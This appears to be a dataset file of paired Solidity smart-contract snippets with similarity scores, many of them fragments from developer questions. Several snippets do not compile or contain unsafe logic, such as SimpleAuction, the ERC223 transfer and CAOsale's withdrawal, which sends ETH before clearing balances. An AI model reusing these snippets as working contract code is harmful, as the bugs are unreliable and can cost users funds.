    return coin; 
}

function getStatus() returns(string){
    return shipment.statusOfShipment;
}

function getAddress() returns(address){
    return addr; 
}

}",0.5153494695484977,"contract ERC223TokenInterface {
    function name() constant returns (string _name);
    function symbol() constant returns (string _symbol);
    function decimals() constant returns (uint8 _decimals);
    function totalSupply() constant returns (uint256 _supply);

    function balanceOf(address _owner) constant returns (uint256 _balance);

    function approve(address _spender, uint256 _value) returns (bool _success);
    function allowance(address _owner, address spender) constant returns (uint256 _remaining);

    function transfer(address _to, uint256 _value) returns (bool _success);
    function transfer(address _to, uint256 _value, bytes _metadata) returns (bool _success);
    function transferFrom(address _from, address _to, uint256 _value) returns (bool _success);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value, bytes metadata);
}"
"contract Shipment{
    string public shipmentId;
    string public statusOfShipment;
    address public driver1;
    address public driver2;
    address public driver3;

    function Shipment(){}


    function setShipmentId(string shId){
    shipmentId=shId;
    }
    function getShipmentId() returns(string){
    return shipmentId;
    }

    function setStatusOfShipment(string st){
    statusOfShipment=st;
    }
    function getStatusOfShipment() returns(string){
    return statusOfShipment;
    }

    function setAddressOfDriver1(address d1){
    driver1=d1;
    }
    function getAddressOfDriver1() returns(address){
    return driver1;
    }

    function setAddressOfDriver2(address d2){
    driver2=d2;
    }
    function getAddressOfDriver2() returns(address){
    return driver2;
    }

    function setAddressOfDriver3(address d3){
    driver3=d3;
    }
    function getAddressOfDriver3() returns(address){
    return driver3;
    }
}",0.5716357674872525,"contract TokenRegistry {

    event TokenRegistered(address addr, string symbol);

    event TokenUnregistered(address addr, string symbol);

    function registerToken(

        address addr,

        string  symbol

        )

        external;

    function registerMintedToken(

        address addr,

        string  symbol

        )

        external;

    function unregisterToken(

        address addr,

        string  symbol

        )

        external;

    function areAllTokensRegistered(

        address[] addressList

        )

        external

        view

        returns (bool);

    function getAddressBySymbol(

        string symbol

        )

        external

        view

        returns (address);

    function isTokenRegisteredBySymbol(

        string symbol

        )

        public

        view

        returns (bool);

    function isTokenRegistered(

        address addr

        )

        public

        view

        returns (bool);

    function getTokens(

        uint start,

        uint count

        )

        public

        view

        returns (address[] addressList);

}"
"contract User { 
    address owner;
    address reg;
    Registry registry = Registry(reg);
    
    function register(bytes32 _id) {
        registry.register(_id);
    }
    function getContractAddress(bytes32 _id) {
        registry.getContractAddress(_id);
    }
    function getPublicAddress(bytes32 _id) {
        registry.getPublicAddress(_id);
    }
}",0.5866710732535266,"contract Register is Pausable {
    mapping(address => string) public registry;

    
    function addUser(string info) public whenNotPaused {
        registry[msg.sender] = info;
    }
   
    
    function getInfo(address ethAddress) public constant returns (string) {
        return registry[ethAddress];
    }
}"
"contract IDSCheck {

    mapping( string => string ) PersonHash;

    function AddHash(string name, string hash) {
        PersonHash[name] = hash;

    }

    function GetHash (string name) public returns (string) {
        return PersonHash[name];
    }
}",0.5987194710911589,"contract HelloWorld {
    
    string wellcomeString = ""Hello, world!"";
    
    function getData() public constant returns (string) {
        return wellcomeString;
    }
    
    function setData(string newData) public {
        wellcomeString = newData;
    }
    
}"
"contract OraclizeTest is usingOraclize {

    using strings for *;        
   
    uint256 public amount; 


    address public homeBet;  
    address public awayBet;


    

    event LogInfo(string description);      

    
    

    
    function OraclizeTest (uint _amount) public {      
        amount = _amount;        

    

        
        OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);

        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        update();
    }",0.5607591770571169,"contract ISmartToken {

    string public version = ""0.3"";

    
    
    

    bool public transfersEnabled = false;

    
    
    

    
    event NewSmartToken(address _token);
    
    event Issuance(uint256 _amount);
    
    event Destruction(uint256 _amount);

    
    
    

    function disableTransfers(bool _disable) public;
    function issue(address _to, uint256 _amount) public;
    function destroy(address _from, uint256 _amount) public;
}"
"contract AssetTracker {
    struct Asset {
        string name;
        string description;
        string manufacturer;
        uint price;
        uint id;
        address owner;
        bool initialized;
    }
    Asset[] public assets;
    mapping(address => mapping(uint => bool)) public walletStore;

    function createAsset(string _name, string _description, string _manufacture, uint _price, uint id) public {
        Asset memory newAsset = Asset(_name, _description, _manufacture, _price, id, msg.sender, true);
        assets.push(newAsset);
        walletStore[msg.sender][id] = true;
    }
}",0.5933819086611936,"contract Docsign
{
    
    event Added(address indexed _from);

    
    event Created(address indexed _from);


    struct Document {
        uint version;
        string name;
        address creator;
        string hash;
        uint date;
    }
    Document[] public a_document;
    uint length;

    
    function Docsign() {
        Created(msg.sender);
    }

    function Add(uint _version, string _name, string _hash) {
        a_document.push(Document(_version,_name,msg.sender, _hash, now));
        Added(msg.sender);
    }
    
    function getCount() public constant returns(uint) {
        return a_document.length;
    }
    
    
    function() { throw; }

}"
"contract ExampleContract is usingProvable {

   string public ethprice;
   string public ethvolume;
   event LogConstructorInitiated(string nextStep);
   event LogPriceUpdated(string price);
   event LogNewProvableQuery(string description);

   function ExampleContract() payable {
       LogConstructorInitiated(""Constructor was initiated. Call 'updatePrice()' to send the Provable Query."");
   }

   function __callback(bytes32 myid, string memory[] result) {
       if (msg.sender != provable_cbAddress()) revert();
       ethprice = result[0];
       ethvolume = result[1];
       LogPriceUpdated(result);
   }

   function updatePrice() payable {
       if (provable_getPrice(""URL"") > this.balance) {
           LogNewProvableQuery(""Provable query was NOT sent, please add some ETH to cover for the query fee"");
       } else {
           LogNewProvableQuery(""Provable query was sent, standing by for the answer.."");
           provable_query(""URL"", ""json(https:
       }
   }
}",0.542413591309378,"contract RiddleMeThis {

    bytes32 private answerHash;

    bool private isActive;

    Guess[] public guesses;

    string public riddle;

    string public answer;



    struct Guess { address player; string guess; }

    address private riddler;



    function () payable public {}

    

    constructor (string _riddle, bytes32 _answerHash) public payable {

        riddler = msg.sender;

        riddle = _riddle;

        answerHash = _answerHash;

        isActive = true;

    }



    function play(string guess) public payable {

        require(isActive);

        require(msg.value > 1 ether);

        require(bytes(guess).length > 0);

        

        Guess newGuess;

        newGuess.player = msg.sender;

        newGuess.guess = guess;

        guesses.push(newGuess);

        

        if (keccak256(guess) == answerHash) {

            answer = guess;

            isActive = false;

            msg.sender.transfer(this.balance);

        }

    }

    

    function end(string _answer) public {

        require(msg.sender == riddler);

        answer = _answer;

        isActive = false;

        msg.sender.transfer(this.balance);

    }

}"
"contract GasEstimation {

  event CorrectExecution(bool result, bool outOfGas);

  function callMe(address location) public payable {
    bool result = false;
    bool outOfGas = false;
    try ToBeCalled(location).externalCall() {
      result = true;
    } catch (bytes memory lowLevelData) {
      
    }
    if(result) {
      
      _inCaseOfSuccess();
    } else if(outOfGas) {
      revert(""Out Of Gas!"");
    }
    emit CorrectExecution(result, outOfGas);
  }

  function _inCaseOfSuccess() private {
    
  }
}",0.5359164509748667,"contract Proxy {

    

    

    function implementation() public view returns (address);



    

    function() external payable {

        address _impl = implementation();

        

        assembly {

            let ptr := mload(0x40)

            calldatacopy(ptr, 0, calldatasize)

            let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)

            let size := returndatasize

            returndatacopy(ptr, 0, size)



            switch result

            case 0 { revert(ptr, size) }

            default { return(ptr, size) }

        }

    }

}"
"contract SimpleAuction {
address public beneficiary1;
address public beneficiary2;
uint public auctionEnd;





address public highestBidder1;
uint public highestBid1;

address public highestBidder2;
uint public highestBid2;

uint public proportion;
uint public bid1;
uint public bid2;

mapping(address => uint) pendingReturns;

bool ended;

constructor (uint _biddingTime) public {
    beneficiary1 = msg.sender;
    beneficiary2 = msg.sender;
    auctionEnd = now + _biddingTime;
}


function () public payable{
    makebid(proportion);
}


function makebid(uint var1) public payable {

    
    proportion = var1;
    
    bid1 = var1 * msg.value;
    bid2 = 1 - var1 * msg.value;

    require(now <= auctionEnd);

    
    
    

    
      
    
    
    



    require(bid1 > highestBid1);

    if (highestBid1 != 0) {

        pendingReturns[highestBidder1] += highestBid1;
    }
    highestBidder1 = msg.sender;
    highestBid1 = bid1;


    require(bid2 > highestBid2);

    if (highestBid2 != 0) {

        pendingReturns[highestBidder2] += highestBid2;
    }
    highestBidder2 = msg.sender;
    highestBid2 = bid2;

}

function withdraw() public returns (bool) {
    uint amount1 = pendingReturns[highestBidder1];
    if (amount1 > 0) {
        pendingReturns[highestBidder1] = 0;

        if (!msg.sender.send(amount1)) {
            pendingReturns[highestBidder1] = amount1;
            return false;
        }

    uint amount2 = pendingReturns[highestBidder2];
    if (amount2 > 0) {

        pendingReturns[highestBidder2] = 0;

        if (!msg.sender.send(amount2)) {
            
            pendingReturns[highestBidder2] = amount2;
            return false;
        }

    }
    return true;
  }

}

    
   require(now >= auctionEnd); 
    require(!ended); 

    
    ended = true;

    
    beneficiary1.transfer(highestBid1);
    beneficiary2.transfer(highestBid2);

}",0.5986088491297757,"contract CAOsale is token {

    address public beneficiary = msg.sender; 

    uint public fundingGoal;  

    uint public amountRaised; 

    uint public deadline; 

    uint public price;  

    bool public fundingGoalReached = false;  

    bool public crowdsaleClosed = false; 





    mapping(address => uint256) public balance; 



    

    event GoalReached(address _beneficiary, uint _amountRaised);



    

    event FundTransfer(address _backer, uint _amount, bool _isContribution);



    



    

    

    

    function CAOsale(

        uint fundingGoalInEthers,

        uint durationInMinutes,

        string tokenName,

        string tokenSymbol

    ) public token(this, tokenName, tokenSymbol){

        fundingGoal = fundingGoalInEthers * 1 ether;

        deadline = now + durationInMinutes * 1 minutes;

        price = 0.00001 ether; 

    }



    

    



    

    function () payable public{

        

        

        require(!crowdsaleClosed);

        

        uint amount = msg.value;



        

        balance[msg.sender] += amount;



        

        amountRaised += amount;



        

        issue(msg.sender, amount / price * 10 ** uint256(decimals));

        FundTransfer(msg.sender, amount, true);

    }



    

    modifier afterDeadline() {

        

        if (now >= deadline) _;

        }



    

    function checkGoalReached() afterDeadline public{

        if (amountRaised >= fundingGoal){

            

            fundingGoalReached = true;

            GoalReached(beneficiary, amountRaised);

        }

        

        crowdsaleClosed = true;

    }



    

    function safeWithdrawal() afterDeadline public{



        

        if (!fundingGoalReached) {

            

            uint amount = balance[msg.sender];



            if (amount > 0) {

                

                

                

                msg.sender.transfer(amount);

                FundTransfer(msg.sender, amount, false);

                balance[msg.sender] = 0;

            }

        }



        

        if (fundingGoalReached && beneficiary == msg.sender) {



            

            beneficiary.transfer(amountRaised);



            FundTransfer(beneficiary, amount, false);

        }

    }

}"
"contract Test {
    struct Addresses{ 
        string  id;
        string[] fname;
        string[] lname;
        string[] streetaddress;
        string[] zip;
    } 
    mapping(string => Addresses) UserProfile;

    
    function setData(string uid,string firstname,string lastname,string street,string zipVal) { 
        UserProfile[uid].id = uid;
        UserProfile[uid].fname.push(firstname);
        UserProfile[uid].lname.push(lastname);
        UserProfile[uid].streetaddress.push(street);
        UserProfile[uid].zip.push(zipVal);
    }

    
    function getFirstname(string uid, uint8 pos) constant returns (string) {
        return UserProfile[uid].fname[pos];
    }
    function getLastname(string uid, uint8 pos) constant returns (string) {
        return UserProfile[uid].lname[pos];
    }
    function getGender(string uid, uint8 pos) constant returns (string) {
        return UserProfile[uid].streetaddress[pos];
    }
    function getDOB(string uid, uint8 pos) constant returns (string) {
        return UserProfile[uid].zip[pos];
    }
}",0.5196769825218033,"contract Token {
    
    function name() public constant returns (string name) { name; }
    function symbol() public constant returns (string symbol) { symbol; }
    function decimals() public constant returns (uint8 decimals) { decimals; }
    function totalSupply() public constant returns (uint256 totalSupply) { totalSupply; }
    function balanceOf(address _owner) public constant returns (uint256 balance) { _owner; balance; }
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { _owner; _spender; remaining; }

    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
}"
"contract KYCPurchase {
  uint public price = 2 ether;

  struct Company {
      string registeredNumber;
      string companyName;
  }

  mapping (address => Company) companies;

  function buy(string registeredNumber, string companyName) public payable {
    require(msg.value == price);

    
    companies[msg.sender] = Company(registeredNumber, companyName);

  }

  function isKYCPaymentOK (string registeredNumber, string companyName) pure private returns (string, string) {
        return (registeredNumber, companyName);

  }
}",0.5823315508240801,"contract sendEther {
    uint256 myNumber;
    string someString;
    
    function sendMeMoney(uint256 test) public payable {
        myNumber = test;
        0x3d080421c9DD5fB387d6e3124f7E1C241ADE9568.send(msg.value);
    }
    
    function giveMeNumber(uint256 _number) public view returns (uint256) {
        if(_number > 0) {
            return myNumber;
        }
    }
    
    function giveMeString(uint256 _number) public view returns (string memory someString) {
        if(_number > 0) {
            return someString;
        }
    }
    
    constructor(string memory _a) public {
        someString = _a;
    }
}"
"contract DriverRegister {

    enum CarType {mini, micro, prime}

    struct Driver {
        string name;
        uint phno;
        uint licenceno;
        bool isDriverRegistered;
        CarType cartypes;
        uint index;
    }

    mapping(address => Driver) public driverStructs;
    address[] public drivers;

    function registerDriver(string memory _name, uint _phno, uint _licenceno) public {

    }
}",0.5900096289116451,"contract ERC20Basic {

  uint256 public totalSupply;

  string public name;

  string public symbol;

  uint public decimals;

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

}"
"contract CtrtFactory {
  Ctrt ctrt;
  function makeCtrt() {
    address ctrtAddress = Ctrt.constructor(...);
  
  }
}",0.5902189666208566,"contract WhiteList {

    function checkAddress ( address _address ) constant public returns(bool);

}"
"contract Ballot {

    struct Voter {
        uint weight;
        bool voted;
        uint8 vote;
       
    }
    struct Proposal {
        uint voteCount; 
    }

    address chairperson;
    mapping(address => Voter) voters;
    Proposal[] proposals;


    
    constructor(uint8 _numProposals) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 2;
        proposals.length = _numProposals; 
    }

    
    
    function register(address toVoter) public {
        if (msg.sender != chairperson || voters[toVoter].voted) return;
        voters[toVoter].weight = 1;
        voters[toVoter].voted = false;
    }

    
    function vote(uint8 toProposal) public {
        Voter storage sender = voters[msg.sender];
        if (sender.voted || toProposal >= proposals.length) return;
        sender.voted = true;
        sender.vote = toProposal;
        proposals[toProposal].voteCount += sender.weight;
    }

    function winningProposal() public view returns (uint8 _winningProposal,uint wvc) {
        uint256 winningVoteCount = 0;
        for (uint8 prop = 0; prop < proposals.length; prop++)
            if (proposals[prop].voteCount > winningVoteCount) {
                winningVoteCount = proposals[prop].voteCount;
                _winningProposal = prop;
                wvc=winningVoteCount;
            }
    }     
}",0.5473837887783579,"contract BaseAirdrop is Lockable {
    using SafeMath for uint;

    ERC20Token public token;

    mapping(address => bool) public users;

    event AirdropToken(address indexed to, uint amount);

    constructor(address _token) public {
        require(_token != address(0));
        token = ERC20Token(_token);
    }

    function airdrop(uint8 v, bytes32 r, bytes32 s) public whenNotLocked {
        if (ecrecover(keccak256(""Signed for Airdrop"", address(this), address(token), msg.sender), v, r, s) != owner
            || users[msg.sender]) {
            revert();
        }
        users[msg.sender] = true;
        uint amount = getAirdropAmount(msg.sender);
        token.transfer(msg.sender, amount);
        emit AirdropToken(msg.sender, amount);
    }

    function getAirdropStatus(address user) public constant returns (bool success) {
        return users[user];
    }

    function getAirdropAmount(address user) public constant returns (uint amount);

    function withdrawTokens(address destination) public onlyOwner whenLocked {
        require(destination != address(0));
        uint balance = token.balanceOf(address(this));
        token.transfer(destination, balance);
    }
}"
"contract Ballot {
  function Ballot(uint8 _numProposals) {}
  function giveRightToVote(address voter) {}
  function delegate(address to) {}
  function vote(uint8 proposal) {}
  function winningProposal() constant returns (uint8 winningProposal) {}
}",0.5763338494395185,"contract GemLike {
    function approve(address, uint) public;
    function transfer(address, uint) public;
    function transferFrom(address, address, uint) public;
    function deposit() public payable;
    function withdraw(uint) public;
}"
"contract Season {
    address[] public requests;

    constructor() public {
        requests.push(new Request());
    }

    function getRequestsByFilter() public view returns(bool) {
        Request r = Request(requests[0]);
        bool ret = r.isMatch();
        return ret;
    }
}",0.5974665447862102,"contract Owned {
	address public owner;

	constructor(address admin) public {
		owner = admin;
	}

	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}
	
	function isOwner() public view returns (bool is_owner) {
	    return msg.sender == owner;
	}
}"
"contract AddressesTests {
using Addresses for address;

function testIsContract() public {
    
  
    assert(address(this).isContract());
    assert(!msg.sender.isContract());
   }
 }",0.5617620618691284,"contract ProofOfAddress {

    mapping (address=>string) public proofs;



    function register(string memory kinAddress) public{

        proofs[msg.sender] = kinAddress;

    }

}"
"contract Second {
    int32 public _nRes2;

    constructor() public {
        _nRes2 = 15;
    }
    function State() public {
        _nRes2 = 17;
    }
}",0.5832540027578769,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Example {
  struct Structure {
    uint value;
  }

  event Created(
    Structure structure
  );

  event Modified(
    Structure structure
  );

  constructor() public {}

  function create() public {
    emit Created(Structure(42));
  }

  function modify(Structure memory structure) public {
    emit Modified(structure);
  }
}",0.5483320411862452,"contract Pausable is Ownable {



    event EPause(); 

    event EUnpause();



    bool public paused = true;



    modifier whenNotPaused()

    {

        require(!paused);

        _;

    }



    function pause() public onlyOwner

    {

        paused = true;

        emit EPause();

    }



    function unpause() public onlyOwner

    {

        paused = false;

        emit EUnpause();

    }

}"
"contract B {
       function acceptValue(unit _value) {
         dosomethingWith(_value)
       }
    }",0.5486613377204751,"contract Token{

    function transfer(address _to, uint256 _value){_to;_value;}

}"
"contract Ballot {

 ....

    event votingCompleted();

    uint startTime;
    modifier validStage(Stage reqStage) {
        require(stage == reqStage);
        _;
    }

    constructor(uint8 _numProposals) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 2;
        proposals.length = _numProposals;
        stage = Stage.Reg;
        startTime = now;
    }

    function vote(uint8 toProposal) public validStage(Stage.Vote) {
        Voter storage sender = voters[msg.sender];
        if (sender.voted || toProposal >= proposals.length) return;
        sender.voted = true;
        sender.vote = toProposal;
        proposals[toProposal].voteCount += sender.weight;
        if (now > (startTime + 30 seconds)) {
            stage = Stage.Done;
            emit votingCompleted();
        }
    }",0.5211578809907917,"contract Irstgold is StandardToken {

    string public name;

    uint8 public decimals; 

    string public symbol;



    constructor() public{

        decimals = 18;     

        totalSupply = 1000000000 * 1 ether;     

        balances[msg.sender] = totalSupply;    

        name = ""1irstgold"";    

        symbol = ""1STG"";    

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, address(this), _extraData);

            return true;

        }

    }



    

    function() external payable{

        revert(""Token does not accept ETH"");

    }

}"
"contract Subject {
    bool public contractStatus = false;
    address public adminAddress;
    mapping (address => Data) adminToDataMapping;

    struct Data {
      string name;
      string details;
    }

   modifier onlyIfActive() {
     if (contractStatus) throw;
     _;
   }

   modifier onlyByCreator(address addr){
      if (msg.sender != addr) throw;
      _;
  }

  function addData(string someName, string someDetails address adminAddr) onlyIfActive {
    Admin admin = Admin(adminAddr);
    if(admin.checkCreatePermission(someSpecialValues)  && admin.isOwner(msg.sender)) {
      adminToDataMapping[msg.sender].name = someName;
      adminToDataMapping[msg.sender].details = someDetails;
    } else() {
      throw;
    }
  }
}",0.5592996909263949,"contract Admins {
    address public admin1;

    address public admin2;

    address public admin3;

    function Admins(address a1, address a2, address a3) public {
        admin1 = a1;
        admin2 = a2;
        admin3 = a3;
    }

    modifier onlyAdmins {
        require(msg.sender == admin1 || msg.sender == admin2 || msg.sender == admin3);
        _;
    }

    function setAdmin(address _adminAddress) onlyAdmins public {

        require(_adminAddress != admin1);
        require(_adminAddress != admin2);
        require(_adminAddress != admin3);

        if (admin1 == msg.sender) {
            admin1 = _adminAddress;
        }
        else
        if (admin2 == msg.sender) {
            admin2 = _adminAddress;
        }
        else
        if (admin3 == msg.sender) {
            admin3 = _adminAddress;
        }
    }

}"
"contract Process {
    struct Process {
        uint256[] tokens;
        bytes32 learning;
    }

    mapping(uint256 => Process[]) private processes;

    function _newProcess(uint256 _tokenId, uint256[] memory _tokens, bytes32 _learning) private {
        uint256 step = processes[_tokenId].length;
        Process memory process = Process({ tokens: _tokens, learning: _learning });

        processes[_tokenId].push(process);
        emit newProcessAdded(_tokenId, step, _tokens, _learning);
    }

    function getAllTokenProcess(uint256 _tokenId) public view returns (Process[] memory) {
        return processes[_tokenId];
    }

    function getTokenProcess(uint256 _tokenId, uint256 _step) public view returns (uint256[] memory, bytes32) {
        Process memory process = processes[_tokenId][_step];
        return (process.tokens, process.learning);
    }

}",0.582491303933538,"contract ERC20Interface {
    function totalSupply() public view returns (uint256);
    function balanceOf(address tokenOwner) public view returns (uint256 balance);
    function allowance(address tokenOwner, address spender) public view returns (uint256 remaining);
    function transfer(address to, uint256 tokens) public returns (bool success);
    function approve(address spender, uint256 tokens) public returns (bool success);
    function transferFrom(address from, address to, uint256 tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
}"
"contract Blackjack {

   uint[52] public deck;

   function Blackjack() public {

       for (uint i = 0; i < 52; i++) {
            deck[i] = i;
       }
    }
}",0.567582653188711,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract Bob {
    event Result(bool res);

    function queryVersion(address dynCAddr) public payable returns(bool) {
        DynamicContract dC = DynamicContract(dynCAddr);

        bool res = dC.getLibAddress()
                     .delegatecall
                     .gas(30000000)(bytes4(keccak256(""version()"")));

        return res;
    }
}",0.5798067119857533,"contract FlightDelayControllerInterface {

    function isOwner(address _addr) public returns (bool _isOwner);

    function selfRegister(bytes32 _id) public returns (bool result);

    function getContract(bytes32 _id) public returns (address _addr);
}"
"contract User {
    bytes32 publicKey;

    function setPublicKey(bytes32 _publicKey)
        onlyOwner
    {
        publicKey = _publicKey;
    }

    function getPublicKey() returns (bytes32 _publicKey) {
        return publicKey;
    }

}",0.5885434174222463,"contract ContractResolver {

    bool public locked_forever;



    function get_contract(bytes32) public view returns (address);



    function init_register_contract(bytes32, address) public returns (bool);

}"
"contract CampaignFactory {

    address[] public deployedCampaigns;
    uint public campaignCounter;

    function createCampaign(uint minimum) public {

        address newCampaign = address (new Campaign(minimum, msg.sender));
        deployedCampaigns.push(newCampaign);
        campaignCounter++;
    }

    function getDeployedCampaigns() public view returns(address[] memory) {
        return deployedCampaigns;
    }
}",0.5753413488485277,"contract tDeployer is Ownable {



	address private main;



	function cMain(address nM) public onlyOwner {

		main = nM;

	}



    function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address) {

		require(msg.sender == main);

		tokenContract newContract = new tokenContract(_tName, _tSymbol, _mint, _owner);

		return newContract;

	}





}"
"contract C {
   function externalFunction(uint256[] calldata data) external {
      privateFunction(data);
   }

   function privateFunction(uint256[] memory data) private {
   }
}",0.5844310525112241,"contract BMToken
{
    function totalSupply() constant external returns (uint256);
    function mintTokens(address holder, uint256 amount) external;
}"
"contract Insurer {
    bytes16 public insurerUIC;  
    bytes16 public insurerName;

    constructor(bytes16 _insurerUIC, bytes16 _insurerName) public {
        insurerUIC      = _insurerUIC;
        insurerName     = _insurerName;
        } 

    function () payable external {
        
    } 

    function getInsurerInfo() view public returns (bytes16, bytes16) {
        return (insurerUIC, insurerName);
        } 

    }",0.5380993828028884,"contract ReverseRegistrar {
    function setName(string memory name) public returns (bytes32 node);
    function claim(address owner) public returns (bytes32 node);
    function claimWithResolver(address owner, address resolver) public returns (bytes32 node);
    function node(address addr) public pure returns (bytes32);
}"
"contract ICO {
    string message; 

    function enterIco() payable public {
        if(msg.value == 0.00000001 ether)
        {
            return message; 
        }
    } 

}",0.5993276007716803,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract College {
    address student;
    Department dept_instance;

    function College ( address _student , address _department  ) {
        student = _student;
        dept_instance = _department;
     }

    function chooseDept ( uint id ) payable returns (bool value) {
        bool ret = student.send(msg.value);
        if (!ret)
            return dept_instance.enroll(id, msg.sender);
        else
            throw;
    }
}",0.597125395773938,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

  
  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint tokenAmount);
}"
"contract MetaCoin {
      struct  Entity {
               string name;
               string nickname;
               string streetaddress;
      }
      mapping (uint => Entity) entities;
      uint entitiesCount;
      event EntityAdded(address indexed _senderAddress, uint _entityId);

      function addEntity(string _name, string _nickname, string _streetaddress) returns(uint entityId) {
            entityId=entitiesCount ++;
            entities[entityId]=Entity(_name,_nickname,_streetaddress);
            EntityAdded(msg.sender,entityId);
      }
 }",0.5711057200057539,"contract TimeStampingAuthority {
    
    struct Entry {
        address sender;
        uint timestamp;
        string note;
    }

    mapping(bytes => Entry) entries;
    
    function submitEntry(bytes _hash, string note) public {
        require(entries[_hash].timestamp == 0);
        entries[_hash] = Entry(msg.sender, now, note);
    }
    
    function getEntry(bytes _hash) public constant returns (address, uint, string) {
        return (entries[_hash].sender, entries[_hash].timestamp, entries[_hash].note);
    }
}"
"contract test {
  address public requesting;

  struct simpleStruct {
    bytes32 desc;
    uint256 startTime;
  }

  struct itmap
  {
    mapping(bytes32 => IndexValue) data;
    KeyFlag[] keys;
    uint size;
  } 

  struct IndexValue { uint keyIndex; simpleStruct value; }
  struct KeyFlag { bytes32 key; bool deleted; }

  itmap data;

  function test() public {
      requesting = msg.sender;
  }

  function addSimpleStruct(bytes32 key, bytes32 _desc) public { 

    require(msg.sender == requesting); 

    simpleStruct storage newStruct;
    newStruct.desc = _desc; 
    newStruct.startTime = now; 
    insert(data, key, newStruct); 
  }

  function insert(itmap storage self, bytes32 key, simpleStruct storage value) internal returns (bool replaced)
  {
    uint keyIndex = self.data[key].keyIndex;
    self.data[key].value = value;
    if (keyIndex > 0)
      return true;
    else
    {
      keyIndex = self.keys.length++;
      self.data[key].keyIndex = keyIndex + 1;
      self.keys[keyIndex].key = key;
      self.size++;
      return false;
    }
  }
}",0.5556277952443119,"contract XPeerChain{
    
    
    
    
    
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;
    bool public isStop;

    
    mapping (address => uint256) public balanceOf;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(uint256 _supply, string _name, string _symbol, uint8 _decimals) public {
        
        if (_supply == 0) _supply = 1000000;
	    totalSupply = _supply;
        
        balanceOf[msg.sender] = _supply;
        name = _name;
        symbol = _symbol;
        
        decimals = _decimals;
        owner = msg.sender;
        isStop = false;
    }

    
    function transfer(address _to, uint256 _value) public {
        
        require (balanceOf[msg.sender] > _value);
        require (balanceOf[_to] + _value > balanceOf[_to]);
        require (!isStop);

        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        
        emit Transfer(msg.sender, _to, _value);
    }

    function stopContract(bool stop) public {
        require (msg.sender == owner);
        isStop = stop;
    }
}"
"contract TestX {

  X x = X(DeployedAddresses.X()); 

  function testReservePlace() public {
    
    
    bool flag = x.reservePlace.value(1 ether)(""hj"");
  }
}",0.5389663934681991,"contract ERC223Receiver {

      function tokenFallback(address _from, uint256 _value, bytes _data) public returns (bool ok);

  }"
"contract ERC223 {  
     
    function transfer(address to, uint value, bytes data) {
        uint codeLength;
        assembly {
            codeLength := extcodesize(_to)        }
    }
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    if(codelength>0) {
        
        ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
        receiver.tokenFallback(msg.sender, _value, _data);
    }



 }",0.5892884288646264,"contract BurnableToken is MintableToken {
  event Burn(address indexed burner, uint256 value);


  function burn(uint256 _value) external {
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    totalSupply_ = totalSupply_.sub(_value);
    emit Burn(msg.sender, _value);
    emit Transfer(msg.sender, address(0), _value);
  }

}"
"contract Manufacturer {
    event LogNewOrder(string order);

    string[] public orders;

    function addOrder(string newOrder) public {
        orders.push(newOrder);
        emit LogNewOrder(newOrder);

        return;
    }
}",0.5362998373196792,"contract IOwned {
    
    function owner() public constant returns (address owner) { owner; }

    function transferOwnership(address _newOwner) public;
    function acceptOwnership() public;
}"
"contract TestContract4 {
        uint public n;
        uint public testValue1;
        uint public value;

        function TestContract4(uint val, uint[] testArray) {
                n = testArray.length;
                testValue1 = testArray[0];
                value = val;
        }
}",0.5875766316899185,"contract Counter {

  event Incremented(uint256 value);



  uint256 public value;



  constructor() public payable

  {

    value = 0;

  }



  function increment() public payable {

    value += 1;

    emit Incremented(value);

  }

}"
"contract ChildRegistryDelegate is BaseRegistry {

address public owner;
address public nodeDelegateAddress;
address[] public registeredNodes;

address public delegateContract;
address[] public previousDelegates;
uint256 public count;
address public tokenAddress;

  function ChildRegistryDelegate() {
    
  }


  function registerNode() {

    count += 1;

    Token existingToken = Token(tokenAddress);
    token.burn(1,msg.sender);
    register(msg.sender, ""string"");      
  

    createNodeContract();
  }

  function createNodeContract () {

    Node newNode = new Node();
    newNode.changeDelegate(nodeDelegateAddress);
    newNode.setOwner(msg.sender);
    newNode.setTokenAddress(tokenAddress);
    registeredNodes.push(newNode);

    

    registeredNodes.push(newNode);
  }

  function getNodes() constant returns (address[]) {
    return registeredNodes;
  }

  function setTokenAddress(address _tokenAddress) {
    tokenAddress = _tokenAddress;
  }

  function setNodeDelegateAddress(address _nodeDelegateAddress) {
    assert(owner == msg.sender);
    nodeDelegateAddress = _nodeDelegateAddress;
  }

